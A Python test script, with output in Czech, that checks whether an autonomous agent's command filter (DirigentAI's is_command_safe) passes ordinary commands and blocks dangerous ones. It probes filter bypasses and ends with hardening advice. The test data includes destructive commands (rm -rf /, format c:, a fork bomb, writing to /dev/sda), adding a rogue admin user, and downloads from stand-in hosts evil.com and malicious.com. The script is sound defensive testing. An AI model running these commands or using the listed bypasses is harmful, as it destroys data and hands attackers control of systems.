import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), ".")))

from agents.worker import is_command_safe

def test_autonomy():
    print("Test autonomie a bezpečnosti DirigentAI\n")
    print("=" * 60)
    
    # Test bezpečných příkazů
    safe_commands = [
        "echo 'Hello World'",
        "python --version",
        "dir",
        "ls -la",
        "mkdir test_folder",
        "cd src",
        "git status",
        "npm install express",
        "pip install requests",
        "python app.py",
        "node server.js",
        "cat README.md",
        "type config.ini",
        "find . -name '*.py'",
        "grep -r 'import' .",
    ]
    
    print("1. Bezpečné příkazy (měly by projít):")
    for cmd in safe_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "[OK]" if is_safe else "[BLOCK]"
        print(f"  {status} {cmd}")
        if not is_safe:
            print(f"    Důvod blokace: {reason}")
    
    print("\n" + "=" * 60)
    
    # Test nebezpečných příkazů
    dangerous_commands = [
        "rm -rf /",
        "rm -rf .",
        "rm -rf *",
        "del /f /s /q c:",
        "del *.*",
        "rd /s /q .",
        "format c: /fs:ntfs",
        "shutdown -s -t 0",
        "chmod 777 /etc/passwd",
        "chown -R root:root /",
        "reg delete HKLM\\SOFTWARE\\Microsoft /f",
        "net user hacker Password123 /add",
        "taskkill /f /im explorer.exe",
        "systemctl stop nginx",
        "pkill -9 python",
        "kill -9 $(ps aux | grep python | awk '{print $2}')",
        "pip uninstall -y numpy pandas",
        "npm uninstall react",
        "wget http://malicious.com/script.sh -O /tmp/script.sh",
        "curl -L http://evil.com/payload.exe -o payload.exe",
        ":(){ :|:& };:",
        "python -c 'import os; os.remove(\"important.txt\")'",
        "echo 'malicious' > /dev/sda",
    ]
    
    print("2. Nebezpečné příkazy (měly být blokovány):")
    blocked_count = 0
    for cmd in dangerous_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "[BLOCK]" if not is_safe else "[PASS]"
        if not is_safe:
            blocked_count += 1
            print(f"  {status} BLOKOVÁNO: {cmd}")
            print(f"    Důvod: {reason}")
        else:
            print(f"  {status} PROŠLO (PROBLÉM!): {cmd}")
    
    print("\n" + "=" * 60)
    print(f"Celkem blokováno: {blocked_count}/{len(dangerous_commands)}")
    
    # Analýza zranitelnosti
    print("\n3. Analýza zranitelností:")
    vulnerabilities = []
    
    # Python kód může obejít blacklist
    test_vuln = "python -c \"import os; os.system('echo dangerous')\""
    is_safe, _ = is_command_safe(test_vuln)
    if is_safe:
        vulnerabilities.append("Python kód může obejít blacklist přes os.system()")
    
    # PowerShell na Windows
    test_vuln = "powershell Remove-Item -Recurse -Force ."
    is_safe, _ = is_command_safe(test_vuln)
    if is_safe:
        vulnerabilities.append("PowerShell příkazy nejsou blokovány")
    
    # Bash speciální znaky
    test_vuln = "rm -rf ./../*"
    is_safe, _ = is_command_safe(test_vuln)
    if is_safe:
        vulnerabilities.append("Rekurzivní mazání přes ../ může projít")
    
    if vulnerabilities:
        print("  Nalezené zranitelnosti:")
        for vuln in vulnerabilities:
            print(f"  • {vuln}")
    else:
        print("  Žádné kritické zranitelnosti nenalezeny")
    
    print("\n" + "=" * 60)
    print("Doporučení pro zvýšení bezpečnosti při zachování autonomie:")
    print("1. Přidat sandbox režim (Docker container)")
    print("2. Implementovat allowlist pro běžné bezpečné příkazy")
    print("3. Přidat konfirmační režim pro první spuštění nebezpečných operací")
    print("4. Monitorovat resource usage (CPU, RAM)")
    print("5. Omezit časový limit příkazů na 30s")
    print("6. Zaznamenávat všechny provedené příkazy do audit logu")

if __name__ == "__main__":
    test_autonomy()